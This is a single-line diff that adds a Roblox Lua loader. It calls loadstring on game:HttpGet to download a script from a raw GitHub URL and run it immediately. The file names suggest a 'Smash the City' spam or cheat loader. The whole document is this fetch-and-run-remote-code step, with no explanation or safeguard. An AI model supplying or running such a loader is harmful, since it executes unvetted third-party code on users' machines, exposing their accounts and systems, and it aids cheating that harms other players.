@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/upd-smash-the-city-spam1-15g3ab80kytzv2.lua"))()
